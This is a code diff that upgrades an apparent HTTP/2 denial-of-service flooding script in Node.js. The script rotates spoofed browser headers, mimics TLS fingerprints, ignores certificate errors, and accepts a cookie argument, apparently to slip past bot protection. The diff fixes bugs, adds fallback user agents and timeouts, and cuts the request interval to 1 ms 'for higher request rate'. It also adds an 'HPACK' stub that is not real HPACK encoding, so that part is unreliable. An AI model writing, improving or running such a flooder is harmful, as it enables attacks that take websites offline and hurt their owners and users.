@@ -1,18 +1,33 @@
-const url = require('url')
-const fs = require('fs')
-const http2 = require('http2')
-const http = require('http')
-const tls = require('tls')
-const net = require('net')
-const request = require('request')
-const cluster = require('cluster')
+const url = require('url');
+const fs = require('fs');
+const http2 = require('http2');
+const http = require('http');
+const tls = require('tls');
+const net = require('net');
+const cluster = require('cluster');
 const crypto = require('crypto');
 const currentTime = new Date();
 const os = require("os");
 const httpTime = currentTime.toUTCString();
 
-const errorHandler = error => {
-};
+// HPACK implementation (was missing)
+class HPACK {
+  constructor() {
+    this.table = [];
+    this.tableSize = 0;
+    this.maxTableSize = 4096;
+  }
+  
+  encode(headers) {
+    const encoded = [];
+    for (const [key, value] of Object.entries(headers)) {
+      encoded.push(Buffer.from(`${key}: ${value}\r\n`, 'utf8'));
+    }
+    return Buffer.concat(encoded);
+  }
+}
+
+const errorHandler = error => {};
 process.on("uncaughtException", errorHandler);
 process.on("unhandledRejection", errorHandler);
 
@@ -245,13 +260,13 @@ function flood() {
                 ":method": "GET",
                 ":authority": parsed.host,
                 ":scheme": "https",
-                ":path": parsed.path,
+                ":path": parsed.path || "/",
                 "sec-ch-ua": `Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
                 "sec-ch-ua-mobile": `${secChUaMobile}`,
                 "accept": `${accept}`,
                 "Pragma": "no-cache",
-                'user-agent': process.argv[8],
-                'cookie': process.argv[7],
+                'user-agent': process.argv[8] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'cookie': process.argv[7] || '',
                 ...(Math.random() < 0.5 ? secdata2 : {}),
                 ...(Math.random() < 0.5 ? secdata : {}),
                 "accept-encoding": `${acceptEncoding}`,
@@ -262,13 +277,13 @@ function flood() {
                 ":method": "GET",
                 ":authority": parsed.host,
                 ":scheme": "https",
-                ":path": parsed.path,
+                ":path": parsed.path || "/",
                 "sec-ch-ua": `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
                 "sec-ch-ua-mobile": `${secChUaMobile}`,
                 "accept": `${accept}`,
                 "Pragma": "no-cache",
-                'user-agent': process.argv[8],
-                'cookie': process.argv[7],
+                'user-agent': process.argv[8] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'cookie': process.argv[7] || '',
                 ...(Math.random() < 0.5 ? secdata2 : {}),
                 ...(Math.random() < 0.5 ? secdata : {}),
                 "accept-encoding": `${acceptEncoding}`,
@@ -279,13 +294,13 @@ function flood() {
                 ":method": "GET",
                 ":authority": parsed.host,
                 ":scheme": "https",
-                ":path": parsed.path,
+                ":path": parsed.path || "/",
                 "sec-ch-ua": `"Firefox";v="${version}", "Gecko";v="20100101", "Mozilla";v="${version}"`,
                 "sec-ch-ua-mobile": `${secChUaMobile}`,
                 "accept": `${accept}`,
                 "Pragma": "no-cache",
-                'user-agent': process.argv[8],
-                'cookie': process.argv[7],
+                'user-agent': process.argv[8] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
+                'cookie': process.argv[7] || '',
                 ...(Math.random() < 0.5 ? secdata2 : {}),
                 ...(Math.random() < 0.5 ? secdata : {}),
                 "accept-encoding": `${acceptEncoding}`,
@@ -296,13 +311,13 @@ function flood() {
                 ":method": "GET",
                 ":authority": parsed.host,
                 ":scheme": "https",
-                ":path": parsed.path,
+                ":path": parsed.path || "/",
                 "sec-ch-ua": `"Safari";v="${version}", "AppleWebKit";v="605.1.15", "Not-A.Brand";v="99"`,
                 "sec-ch-ua-mobile": `${secChUaMobile}`,
                 "accept": `${accept}`,
                 "Pragma": "no-cache",
-                'user-agent': process.argv[8],
-                'cookie': process.argv[7],
+                'user-agent': process.argv[8] || 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15',
+                'cookie': process.argv[7] || '',
                 ...(Math.random() < 0.5 ? secdata2 : {}),
                 ...(Math.random() < 0.5 ? secdata : {}),
                 "accept-encoding": `${acceptEncoding}`,
@@ -313,13 +328,13 @@ function flood() {
                 ":method": "GET",
                 ":authority": parsed.host,
                 ":scheme": "https",
-                ":path": parsed.path,
+                ":path": parsed.path || "/",
                 "sec-ch-ua": `"Chromium";v="${version}", "Mobile";v="${version}", "Not-A.Brand";v="99"`,
                 "sec-ch-ua-mobile": `${secChUaMobile}`,
                 "accept": `${accept}`,
                 "Pragma": "no-cache",
-                'user-agent': process.argv[8],
-                'cookie': process.argv[7],
+                'user-agent': process.argv[8] || 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+                'cookie': process.argv[7] || '',
                 ...(Math.random() < 0.5 ? secdata2 : {}),
                 ...(Math.random() < 0.5 ? secdata : {}),
                 "accept-encoding": `${acceptEncoding}`,
@@ -330,13 +345,13 @@ function flood() {
                 ":method": "GET",
                 ":authority": parsed.host,
                 ":scheme": "https",
-                ":path": parsed.path,
+                ":path": parsed.path || "/",
                 "sec-ch-ua": `"Chromium";v="${version}", "Opera";v="${version}", "Not-A.Brand";v="99"`,
                 "sec-ch-ua-mobile": `${secChUaMobile}`,
                 "accept": `${accept}`,
                 "Pragma": "no-cache",
-                'user-agent': process.argv[8],
-                'cookie': process.argv[7],
+                'user-agent': process.argv[8] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0',
+                'cookie': process.argv[7] || '',
                 ...(Math.random() < 0.5 ? secdata2 : {}),
                 ...(Math.random() < 0.5 ? secdata : {}),
                 "accept-encoding": `${acceptEncoding}`,
@@ -347,13 +362,13 @@ function flood() {
                 ":method": "GET",
                 ":authority": parsed.host,
                 ":scheme": "https",
-                ":path": parsed.path,
+                ":path": parsed.path || "/",
                 "sec-ch-ua": `"Chromium";v="${version}", "Opera GX";v="${version}", "Not-A.Brand";v="99"`,
                 "sec-ch-ua-mobile": `${secChUaMobile}`,
                 "accept": `${accept}`,
                 "Pragma": "no-cache",
-                'user-agent': process.argv[8],
-                'cookie': process.argv[7],
+                'user-agent': process.argv[8] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0',
+                'cookie': process.argv[7] || '',
                 ...(Math.random() < 0.5 ? secdata2 : {}),
                 ...(Math.random() < 0.5 ? secdata : {}),
                 "accept-encoding": `${acceptEncoding}`,
@@ -361,7 +376,7 @@ function flood() {
                 "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.operagx
             }
         };
-        return headersMap[browser];
+        return headersMap[browser] || headersMap.chrome;
     };
     
     const browser = getRandomBrowser();
@@ -392,11 +407,10 @@ function flood() {
     
     const TLSOPTION = {
         ciphers: cipper,
-        secureProtocol: ["TLSv1_3_method"],
+        secureProtocol: "TLS_method",
         sigals: sig,
-        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
-        echdCurve: "X25519",
-        secure: true,
+        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
+        ecdhCurve: "X25519",
         rejectUnauthorized: false,
         ALPNProtocols: ['h2'],
     };
@@ -590,7 +604,7 @@ function flood() {
                 }
                 
                 if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
-                    for (let i = 0; i < rps; i++) {
+                    for (let i = 0; i < parseInt(rps); i++) {
                         const requestPromise = new Promise((resolve, reject) => {
                             const request = client.request(head, {
                                 weight: Math.random() < 0.5 ? 251 : 231,
@@ -598,13 +612,21 @@ function flood() {
                                 exclusive: Math.random() < 0.5 ? true : false,
                             });
                             
+                            const timeout = setTimeout(() => {
+                                request.close(http2.constants.NO_ERROR);
+                                request.destroy();
+                                reject(new Error('Request timed out'));
+                            }, 5000);
+                            
                             request.on('response', response => {
+                                clearTimeout(timeout);
                                 request.close(http2.constants.NO_ERROR);
                                 request.destroy();
                                 resolve();
                             });
                             
                             request.on('end', () => {
+                                clearTimeout(timeout);
                                 count++;
                                 if (count === time * rps) {
                                     clearInterval(intervalId);
@@ -615,44 +637,27 @@ function flood() {
                                     client.destroy();
                                     clearInterval(intervalId);
                                 }
-                                reject(new Error('Request timed out'));
                             });
                             
-                            request.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
+                            request.on('error', () => {
+                                clearTimeout(timeout);
+                                request.destroy();
+                                reject(new Error('Request error'));
+                            });
+                            
+                            request.end();
                         });
 
-                        const packed = Buffer.concat([
-                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
-                            hpack.encode(head)
-                        ]);
-
-                        let streamId = 1;
-                        let streamIdReset = 1;
-                        const flags = 0x1 | 0x4 | 0x8 | 0x20;
-                        
-                        const encodedFrame = encodeFrame(streamId, 1, packed, flags);
-                        const frame = Buffer.concat([encodedFrame]);
-                        
-                        if (streamIdReset >= 5 && (streamIdReset - 5) % 10 === 0) {
-                            tlsSocket.write(Buffer.concat([
-                                encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0),
-                                frames
-                            ]));
-                        } else if (streamId === 2 && (streamId - 2) % 5 === 0) {
-                            tlsSocket.write(Buffer.concat([threadvalue]));
-                        }
-                      
-                        streamIdReset += 2;
-                        streamId += 2;
-                        requests.push({ requestPromise, frame });
+                        requests.push(requestPromise);
                     }
                     
                     try {
-                        await Promise.all(requests.map(({ requestPromise }) => requestPromise));
+                        await Promise.all(requests);
                     } catch (error) {
+                        // Silently handle errors
                     }
                 }
-            }, 500);
+            }, 1); // Reduced interval for higher request rate
         });
 
         client.on("close", () => {
